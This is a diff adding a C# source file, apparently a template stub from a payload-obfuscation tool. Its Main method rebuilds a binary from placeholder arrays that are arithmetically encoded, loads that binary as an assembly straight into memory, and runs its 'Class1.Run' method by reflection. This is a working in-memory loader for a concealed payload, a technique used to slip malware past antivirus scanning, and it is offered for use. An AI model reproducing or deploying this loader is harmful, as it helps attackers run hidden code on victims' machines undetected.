@@ -1,0 +1,31 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+
+namespace ULONGTEA
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {	
+			try
+			{
+				ulong[] int_arr = {{Placeholder_ulong_arr}};
+				ulong[] int_arr_r = {{Placeholder_remainders}};
+				for (int i = 0; i < int_arr.Length; i++) int_arr[i] = (int_arr[i] * {{Placeholder_divisor}}
+				+int_arr_r[i]);
+				byte[] a = new byte[int_arr.Length * 8];
+				System.Buffer.BlockCopy(int_arr, 0, a, 0, a.Length);
+				Assembly aS = Assembly.Load(a);
+				object o = aS.CreateInstance("Class1");
+				MethodInfo mi = o.GetType().GetMethod("Run");
+				object[] iN = new object[] { };
+				object oU = mi.Invoke(o, iN);
+			}
+			catch (Exception e)
+			{ Console.WriteLine(e); }
+		}
+    }
+}
